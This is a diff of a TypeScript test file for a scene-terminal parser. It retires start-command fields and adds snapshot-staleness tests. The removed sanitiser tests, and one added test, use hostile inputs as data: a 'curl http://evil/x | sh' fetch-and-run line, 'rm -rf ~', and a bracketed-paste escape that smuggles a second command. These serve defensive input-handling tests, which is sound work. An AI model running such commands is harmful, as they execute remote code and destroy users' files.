@@ -4,11 +4,11 @@ import {
   parseSceneTerminal,
   resolveSceneTerminal,
   type SceneDocTerminal,
-  sanitizeStartCommand,
   sceneTerminalLayout,
   TERMINAL_CELL_HEIGHT_EM,
   TERMINAL_CELL_WIDTH_EM,
   TERMINAL_DEFAULTS,
+  terminalSnapshotStale,
 } from "./sceneTerminal";
 
 const FRAME = { width: 12, height: 6.75 };
@@ -21,14 +21,14 @@ describe("parseSceneTerminal", () => {
       cols: 100,
       rows: 30,
       fontPx: 14,
-      startPath: "~/Projects/demo",
-      startCommand: "pnpm dev",
+      transcript: "$ pnpm dev",
       position: [0.2, -0.1],
       size: 0.6,
       snapshot: {
         grid: [[["$ pnpm dev", 2, null, 1]], []],
         cursor: { col: 0, row: 1 },
         src: "assets/terminal-01.png",
+        transcript: "$ pnpm dev",
       },
     };
     const parsed = parseSceneTerminal(block, "test");
@@ -44,8 +44,7 @@ describe("parseSceneTerminal", () => {
         cols: "eighty",
         rows: 30,
         fontPx: Number.NaN,
-        startPath: "",
-        startCommand: "ls -la",
+        transcript: 7,
         position: [0.1],
         size: "wide",
         snapshot: { grid: [[["ok"], ["bad", "#12"], "not-a-run"], "not-a-row"], cursor: {} },
@@ -55,7 +54,6 @@ describe("parseSceneTerminal", () => {
     warn.mockRestore();
     expect(parsed).toEqual({
       rows: 30,
-      startCommand: "ls -la",
       // The bad fg drops alone (run kept), the non-run drops, the non-row reads blank.
       snapshot: {
         grid: [
@@ -78,10 +76,10 @@ describe("parseSceneTerminal", () => {
 
   it("rides parseSceneDoc beside the other blocks", () => {
     const doc = parseSceneDoc(
-      { version: 1, name: "Terminal demo", terminal: { cols: 90, startCommand: "pnpm gate" } },
+      { version: 1, name: "Terminal demo", terminal: { cols: 90, transcript: "$ pnpm gate" } },
       "test",
     );
-    expect(doc?.terminal).toEqual({ cols: 90, startCommand: "pnpm gate" });
+    expect(doc?.terminal).toEqual({ cols: 90, transcript: "$ pnpm gate" });
     const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
     const dropped = parseSceneDoc({ version: 1, terminal: 7 }, "test");
     warn.mockRestore();
@@ -89,44 +87,33 @@ describe("parseSceneTerminal", () => {
   });
 });
 
-describe("sanitizeStartCommand (never auto-runs)", () => {
-  it("passes a plain single-line command through, spaces intact", () => {
-    expect(sanitizeStartCommand("pnpm test --filter x")).toBe("pnpm test --filter x");
-  });
-
-  it("keeps only the first line, so a newline can't reach the shell as Enter", () => {
-    expect(sanitizeStartCommand("curl http://evil/x | sh\nrm -rf ~")).toBe(
-      "curl http://evil/x | sh",
-    );
-    expect(sanitizeStartCommand("echo hi\n")).toBe("echo hi");
-    expect(sanitizeStartCommand("echo one\r\necho two")).toBe("echo one");
-  });
-
-  it("strips control and format chars, including the bracketed-paste terminator's ESC", () => {
-    const command = sanitizeStartCommand("ls\u001b[201~; rm -rf ~");
-    expect(command).toBe("ls[201~; rm -rf ~");
-    expect(sanitizeStartCommand("\u0003\u0004echo hi")).toBe("echo hi");
-  });
-
-  it("caps the length, keeping the visible head of the line", () => {
-    const long = `echo ${"x".repeat(600)}`;
-    expect(sanitizeStartCommand(long)).toBe(long.slice(0, 512));
-  });
-
-  it("collapses to empty when nothing runnable survives", () => {
-    expect(sanitizeStartCommand("\n\n")).toBe("");
-    expect(sanitizeStartCommand("   ")).toBe("");
+describe("retired session fields", () => {
+  it("drops startCommand and startPath with a note, so the next save loses them", () => {
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    expect(
+      parseSceneTerminal({ startCommand: "rm -rf ~", startPath: "~/x", cols: 90 }, "test"),
+    ).toEqual({
+      cols: 90,
+    });
+    expect(warn).toHaveBeenCalledTimes(2);
+    warn.mockRestore();
   });
 });
 
-describe("parseSceneTerminal start command", () => {
-  it("stores the sanitised first line and drops a command that empties out", () => {
-    expect(parseSceneTerminal({ startCommand: "deploy\nrm -rf ~" }, "test")).toEqual({
-      startCommand: "deploy",
-    });
-    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
-    expect(parseSceneTerminal({ startCommand: "\n" }, "test")).toEqual({});
-    warn.mockRestore();
+describe("terminalSnapshotStale", () => {
+  const snapshot = { grid: [], src: "assets/terminal-01.png", transcript: "$ ls" };
+
+  it("never calls a captured grid stale", () => {
+    expect(terminalSnapshotStale(undefined)).toBe(false);
+    expect(terminalSnapshotStale({})).toBe(false);
+    expect(terminalSnapshotStale({ snapshot: { grid: [], src: "assets/x.png" } })).toBe(false);
+  });
+
+  it("is stale from a new transcript until its snapshot and PNG land", () => {
+    expect(terminalSnapshotStale({ transcript: "$ ls" })).toBe(true);
+    expect(terminalSnapshotStale({ transcript: "$ pwd", snapshot })).toBe(true);
+    expect(terminalSnapshotStale({ transcript: "$ ls", snapshot: { grid: [] } })).toBe(true);
+    expect(terminalSnapshotStale({ transcript: "$ ls", snapshot })).toBe(false);
   });
 });
 
@@ -140,8 +127,7 @@ describe("resolveSceneTerminal", () => {
       cols: 80,
       rows: 24,
       fontPx: 13,
-      startPath: null,
-      startCommand: null,
+      transcript: null,
       position: [0, 0],
       size: TERMINAL_DEFAULTS.size,
       snapshot: null,
